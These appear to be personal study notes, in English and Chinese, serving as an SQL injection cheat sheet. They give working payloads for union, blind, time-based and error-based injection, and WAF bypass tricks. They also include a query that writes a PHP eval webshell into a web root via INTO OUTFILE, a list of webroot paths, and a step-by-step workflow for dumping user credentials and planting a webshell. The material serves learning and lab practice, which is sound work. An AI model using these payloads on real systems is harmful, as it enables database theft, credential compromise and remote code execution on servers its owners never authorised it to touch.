# SQL injection  
SQL is a famous database engine which is used with web server. In this situation, we can inject some SQL based code to get what we want <3.  
[Remember, practice makes perfect!](http://www.tutorialspoint.com/mysql_terminal_online.php)   
  
### Basic injection  
select password from users where name = '$id';  
So, what can we insert into $id?  
```sql  
5566 or 1=1 --  
5566; drop table hello  // execute drop table on second line  

rafael' or 1=1 --  // select password from users where name = 'rafael' or 1=1 --';  
rafael' or ''='    // select password from users where name = 'rafael' or ''=''; 
```  
  
### Union based  
Try on terminal what will **SELECT name, password FROM users WHERE id = 1 UNION SELECT 1, 2** happen?  
Ans: The union result will show as second result with matching column of name and password!  
Therefore, if we just want the info we need, we can make the first clause not exist...  
```sql
select name, password from users where id = 1 and 1 = 0 union select 1, 2;  
```
```sql
// 秀出當前的庫名,使用者
select name, password from users where id = 1 and 1 = 0 union select database(), system_user();
```
```sql  
// 可以得到目前資料庫下的表名,欄位名  
... union select column_name, table_name from information_schema.columns where table_schema=database(); 
```
```sql
// 也可以得到其他資料庫的名字!  
... union select table_schema, table_name from information_schema.columns;  
// 我的 k朋友說: 尋找 資料庫就應該用schemata, 回傳才不會重複而且有效率
... union select group_concat(schema_name) from information_schema.schemata;  // group_concat會將結果合併成一行,我們甚至不需要limit
```
```sql
// 可以得到所有table和column的名字 
... union select table_name, column_name from information_schema.columns;
```
```sql
// 回傳的結果太多 , 我們可以用 limit加以限制
// 網頁常常只能show唯一的結果
... union select table_name, column_name from information_schema.columns limit 1, 1;  
```  
```sql  
// 在做union select時如何知道columns的數量  
? id =' or 1=1 order by N--+    // N一筆一筆增加直到頁面無法正確顯示, --+註解掉後面的條件, +是代表註解後面要有空白!
```
[What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
**group_concat() is also a litte trick.**

### Blind based  
When we cannot show results what we want, we still can find whether it exists or not.  
**True**: Web page shows normal.  
**False**: Web page shows error or blank.  
**Boolean based**  
```sql
length(str)
substr(str,pos,len)   // start index is 1 !!, mid(str,pos,len)
ascii(str)    // we will get decimal,ord()
if(a,b,c)   // if a is true, return b, otherwise return c
id=1' and ascii(substr((select database()),1,1))>65--+
```
Blind-based會花非常多時間，所以可以自己寫script來代替手注! (有時間會把盲注腳本搞出來上傳><  
**Time based**  
```sql
id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if 第一個字非s以後的字母 則延遲5秒
```
  
### Error based  
* Analyze the error message  
```sql
My payload: ?id = 2'
Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''2'') LIMIT 0,1' at line 1
```
看到**near**和**at**的字眼，我們可以刪除左右的單引號，剩下的sql語句應是: ```'  2'  ') LIMIT 0,1```  
因此，注入語句應該是: ```') or 1=1--+```  
* Double injection 
```sql
/**
we need:
count()            // Important* 分組語句多要跟聚合語句配合才能回傳數據列
concat()            // error會把碰撞的主鍵吐出來，因此我們需要把key跟查詢對象concat在一起
floor(), rand()
group by
**/
?id = 1' union select count(*),1,concat((select database()),'~',floor(rand()*2))as a from information_schema.schemata group by a--+
// 當我們清楚原理之後，也可以改成:
?id = 1' or 1=1 group by concat(database(),floor(rand()*2)) having min(0)--+
```
```floor(rand()x2)``` 為穩定序列，造成```group by key```的碰撞! (非常推薦以下文章
[The recommended aticle](http://dogewatch.github.io/2017/02/27/mysql-Error-Based-Injection/)  
* Interger Overflow  
```exp()```在sql版本大於5.5.5時才會有error  
```sql
exp(~(select*from(select user())a));  // 內部查詢結果為0, 經過逐位取反(~)後得到的是18446744073709551615,然而exp(710)就會溢出!
// 後面的a ? 是alias, select*from 後再做子查詢需要給他別名
```
```select```回傳結果也可以用於計算，查詢成功->0，失敗->1 (非常重要!  
[The recommended article](http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/)  
* xpath syntax error  
```extractvalue()```,```updatexml()```諸如此類函數可以對user指定xml語法做查詢語修改  
```sql
?id=1" or/and select extractvalue(1,concat(1,(select database()),0x7e));
?id=1" or/and select updatexml(1,concat(1,(select user()),0x7e),1);
// 由於中間xml語法錯誤，會將database()結果顯示於錯誤訊息
```
  
### WAF bypass
WAF is a defender for web.  
繞過手勢:  
- No 'space'  
  - ```select/**/username/**/from/**/users;```
  - ```union select 1,2``` -> ```union(select(1),2)```
- No 'select'...  
  - ```大小寫混淆 e.g. SelecT``` 
- No comma ','  
  - ```union select 1,2,3``` -> ```union select * from ((select 1)a join (select 2)b join (select 3)c);```   
- Encode your payload  
  - ```URL-ENCODE, HEXIDECIMAL, UNICODE```
  
### Dump file  
將查詢結果放到文件中, 或者將一句話木馬放到系統上的php文件中  
```sql
1' or 1 union select 1,2,"<?php @eval($_POST['hi']);?>" into outfile 'C://xampp/htdocs/sqli/Less-9/muma.php'--+ // 絕對路徑
// 注意前面的語句必須用雙引號處理
```  
熟悉各系統引擎的路徑有助於猜測...  
```php
// winserver IIS 下的 asp server
C:\inetpub\www\root\
// linux server 上 nginx
/usr/local/nginx/html, /home/www/root/default, /usr/share/nginx, /var/www/html
// limux 上 apache
/var/www/html, /var/www/html/htdocs
```  
或者從能輸出結果的頁面得到路徑...  
```sql
// @@basedir : sql 安裝路徑
// @@datadir : 數據庫安裝路徑
id=1' union select 1, @@basedir, @@datadir--+
```
e.g. @@basedir 我們得到```C:/xampp/mysql```的結果, 而網頁根目錄路徑便是```C:/xampp/htdocs/```
  
### Trick of Pentesting  
Here are some tricks of pentesting, step by step from find the vulnerability to exploit it!  
1. SQL vulnerability? injection point?  
```sql
1' or 1"
```
這裡, 我們要判斷出sql漏洞的存在與否, 並且從error message判斷原生語句 

2. Number of columns   
```sql
1' order by N--+   // 不斷增加N的數量, 直到頁面顯示錯誤
```
這裡我們就可以確認query的字段數, union select用起來也比較方便  

3. Where are the SNAKES we want?  
```sql
1' and 1=2 union select 1,2,...N--+   // 加以確認我們注入的東西會出現在哪裡
```  

4. First, we need to know some basic information...   
```sql
...union select user(),database(),version(), @@version_compile_os--+  // 後面兩個分別是資料庫版本以及作業系統版本
```  

5. Start the exciting part...  
```sql
...union select 1,2,...,group_concat(schema_name) from information_schema.schemata--+  // get all database name
```  
```sql
...union select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema='FUCK'+--+  
// FUCK那邊也可以用hex表示
```
```sql
...union select 1,2,...,group_concat(column_name) from information_schema.columns where table_name='users'+--+
// 這邊還是比較喜歡用table_schema,如果懶得決定要鎖定哪張表XD...
```
```sql
// 最終目的
1' and 1=2 union 1,2,...,group_concat(username,password) from users+--+  
```  
6. After get username and password to login, we can write a webshell to upload!
